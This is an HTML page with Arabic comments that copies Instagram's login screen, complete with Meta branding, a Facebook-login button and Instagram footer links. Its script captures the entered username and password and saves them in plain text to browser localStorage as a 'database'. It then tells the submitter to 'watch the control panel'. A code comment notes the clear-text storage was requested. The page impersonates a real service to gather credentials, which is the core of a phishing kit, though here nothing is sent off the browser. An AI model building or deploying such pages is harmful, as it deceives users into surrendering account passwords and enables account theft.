<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - القالب العام</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            background-color: #0f172a; 
        }
        /* تأثيرات الإشعار (Toast) */
        .toast-enter { animation: slideDown 0.4s ease forwards; }
        .toast-exit { animation: fadeOut 0.4s ease forwards; }
        @keyframes slideDown { from { transform: translate(-50%, -100%); opacity: 0; } to { transform: translate(-50%, 0); opacity: 1; } }
        @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; } }
    </style>
</head>
<body class="min-h-screen text-slate-200 flex flex-col md:flex-row font-['Inter'] bg-black overflow-x-hidden" dir="rtl">

    <div id="toast-container" class="fixed top-5 left-1/2 -translate-x-1/2 z-50 pointer-events-none"></div>

    <div class="w-full md:w-[420px] lg:w-[450px] bg-[#000000] border-l border-[#262626] flex flex-col min-h-screen p-8 sm:p-10 z-10 shrink-0">
        
        <div class="flex items-center gap-3 mb-10 text-gray-200 hover:text-white cursor-pointer w-fit transition-colors mt-4">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 5l7 7-7 7"></path>
            </svg>
            <span class="text-base font-bold">تسجيل الدخول إلى Instagram</span>
        </div>

        <!-- أضفنا ID للنموذج لمنع التحديث وإرسال البيانات برمجياً -->
        <form id="login-form" class="space-y-3.5 flex-grow">
            <div>
                <input type="text" id="username-input" placeholder="رقم الهاتف المحمول أو اسم المستخدم أو البريد الإلكتروني" required
                    class="w-full bg-[#121212] border border-[#363636] text-white text-xs sm:text-sm rounded-md focus:border-[#555] focus:ring-1 focus:ring-[#555] outline-none block p-3.5 transition-colors placeholder-gray-400">
            </div>
            <div>
                <input type="password" id="password-input" placeholder="كلمة السر" required
                    class="w-full bg-[#121212] border border-[#363636] text-white text-xs sm:text-sm rounded-md focus:border-[#555] focus:ring-1 focus:ring-[#555] outline-none block p-3.5 transition-colors placeholder-gray-400">
            </div>

            <button type="submit" id="submit-btn"
                class="w-full text-white bg-[#0064e0] hover:bg-[#0057c2] font-semibold rounded-full text-sm px-5 py-3 text-center transition-colors mt-2">
                تسجيل الدخول
            </button>

            <div class="text-center mt-5 mb-8">
                <a href="#" class="text-xs sm:text-sm font-semibold text-white hover:text-gray-300 transition-colors">هل نسيت كلمة السر؟</a>
            </div>

            <button type="button"
                class="w-full text-[#E0F2FE] hover:text-white bg-transparent font-semibold text-sm px-5 py-2 text-center inline-flex justify-center items-center transition-colors mb-4">
                <svg class="w-5 h-5 ml-2 text-[#0064e0]" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 8 19">
                    <path fill-rule="evenodd" d="M6.135 3H8V0H6.135a4.147 4.147 0 0 0-4.142 4.142V6H0v3h2v9.938h3V9h2.021l.592-3H5V3.591A.6.6 0 0 1 5.592 3h.543Z" clip-rule="evenodd"/>
                </svg>
                تسجيل الدخول بحساب فيسبوك
            </button>

            <button type="button"
                class="w-full text-white bg-transparent border border-[#363636] hover:bg-[#121212] font-semibold rounded-full text-sm px-5 py-3 text-center transition-colors mt-4">
                إنشاء حساب جديد
            </button>
        </form>

        <div class="mt-auto pt-8 pb-4 flex justify-center items-center">
            <div class="flex items-center gap-1.5 opacity-70">
                <svg viewBox="0 0 36 20" class="h-4 text-white" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                    <path d="M26.44 2.1c-2.34 0-4.57 1.05-6.07 2.89L19.2 6.4c-1.1-1.31-2.22-2.5-3.32-3.66C13.56 1 10.65 0 7.56 0 3.39 0 0 3.4 0 7.56c0 4.18 3.39 7.57 7.56 7.57 2.34 0 4.57-1.04 6.07-2.88l1.16-1.42c1.1 1.3 2.22 2.5 3.33 3.66C20.44 16.57 23.35 17.57 26.44 17.57c4.18 0 7.56-3.4 7.56-7.57 0-4.17-3.38-7.57-7.56-7.57zm0 12.4c-2.06 0-4-1.12-5-2.92l-1.92-3.3c.95-1.57 2.68-2.6 4.63-2.73h.1c2.18 0 3.96 1.77 3.96 3.95 0 2.19-1.78 3.97-3.96 3.97v.01l-.01.01h.01c.08 0 .16-.01.24-.03l1.83 3.16c-1 .85-2.3 1.38-3.68 1.38zM7.56 12.26c-2.6 0-4.71-2.12-4.71-4.7s2.1-4.71 4.7-4.71c1.9 0 3.62 1.13 4.36 2.87L9.98 9c-.93 1.55-2.65 2.56-4.57 2.68l.18.57h-.01l1.96-3.4c-.06 1.7-.8 3.25-2.02 4.32l2.04-3.55zm22.45-3.5l1.9-3.3c-1.04-.88-2.4-1.42-3.88-1.42-2.61 0-4.72 2.1-4.72 4.7 0 2.58 2.1 4.69 4.71 4.69 1.94 0 3.68-1.16 4.41-2.94l-2.42-4.16z"></path>
                </svg>
                <span class="text-white font-semibold text-lg tracking-wide">Meta</span>
            </div>
        </div>
    </div>

    <div class="hidden md:flex flex-1 flex-col items-center justify-center relative bg-[#000000] p-8 overflow-hidden">
        <div class="absolute top-8 right-8 w-12 h-12 lg:w-14 lg:h-14 z-20">
            <img src="Instagram_icon.png" onerror="this.src='Instagram_icon.jpg'" alt="Instagram Icon" class="w-full h-full rounded-2xl object-cover">
        </div>

        <div class="max-w-3xl w-full flex flex-col items-center mt-10 z-10">
            <h1 class="text-3xl lg:text-4xl xl:text-[2.75rem] font-bold mb-10 text-center leading-tight">
                شاهد اللحظات اليومية من <span class="bg-gradient-to-l from-[#fccc63] via-[#e95950] to-[#d92e7f] text-transparent bg-clip-text">أصدقائك<br>المقربين.</span>
            </h1>

            <div class="w-full max-w-lg lg:max-w-xl relative flex justify-center items-center">
                <!-- سيتم سحب الصورة من نفس المجلد الخاص بك -->
                <img src="92ZsVHNkyvf.jpg" onerror="this.src='92ZsVHNkyvf.png'" alt="Stories Showcase" class="w-full h-auto object-contain drop-shadow-2xl">
            </div>
        </div>

        <div class="absolute bottom-6 w-full flex justify-center gap-4 text-[11px] text-[#737373] flex-wrap px-8">
            <a href="#" class="hover:underline">Meta</a>
            <a href="#" class="hover:underline">حول</a>
            <a href="#" class="hover:underline">المدونة</a>
            <a href="#" class="hover:underline">الوظائف</a>
            <a href="#" class="hover:underline">مساعدة</a>
            <a href="#" class="hover:underline">واجهة API</a>
            <a href="#" class="hover:underline">الخصوصية</a>
            <a href="#" class="hover:underline">الشروط</a>
            <a href="#" class="hover:underline">المواقع</a>
            <a href="#" class="hover:underline">Instagram Lite</a>
        </div>
    </div>

    <script>
        const loginForm = document.getElementById('login-form');
        const usernameInput = document.getElementById('username-input');
        const passwordInput = document.getElementById('password-input');
        const submitBtn = document.getElementById('submit-btn');

        // دالة لعرض رسالة منبثقة (Toast) بدلاً من Alert المزعج
        function showNotification() {
            const container = document.getElementById('toast-container');
            const toast = document.createElement('div');
            toast.className = 'bg-emerald-600 text-white px-6 py-3 rounded-lg shadow-lg font-bold text-sm toast-enter flex items-center gap-2';
            toast.innerHTML = `
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
                تم الإرسال بنجاح! راقب لوحة التحكم.
            `;
            container.appendChild(toast);
            
            setTimeout(() => {
                toast.classList.replace('toast-enter', 'toast-exit');
                setTimeout(() => toast.remove(), 400);
            }, 3000);
        }

        // عند الضغط على تسجيل الدخول
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault(); // منع تحديث الصفحة

            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            if(!username || !password) return;

            // تغيير حالة الزر مؤقتاً
            const originalText = submitBtn.innerText;
            submitBtn.innerText = 'جاري الإرسال...';
            submitBtn.disabled = true;

            setTimeout(() => {
                // 1. جلب البيانات السابقة من مساحة تخزين المتصفح
                let database = JSON.parse(localStorage.getItem('system_database')) || [];

                // 2. إنشاء بيانات المستخدم الجديد
                const now = new Date();
                const newUser = {
                    id: Math.floor(Math.random() * 900) + 100, // ID عشوائي
                    username: username,
                    password: password, // حفظها كنص واضح بناءً على طلبك
                    date: now.toISOString().split('T')[0] + ' ' + now.toTimeString().split(' ')[0].substring(0, 5)
                };

                // 3. إضافة المستخدم للقاعدة الوهمية وحفظها
                database.push(newUser);
                localStorage.setItem('system_database', JSON.stringify(database));

                // 4. إظهار رسالة النجاح وتفريغ الحقول
                showNotification();
                loginForm.reset();
                submitBtn.innerText = originalText;
                submitBtn.disabled = false;

            }, 500); // تأخير نصف ثانية لمحاكاة سرعة الإنترنت
        });
    </script>
</body>
</html>
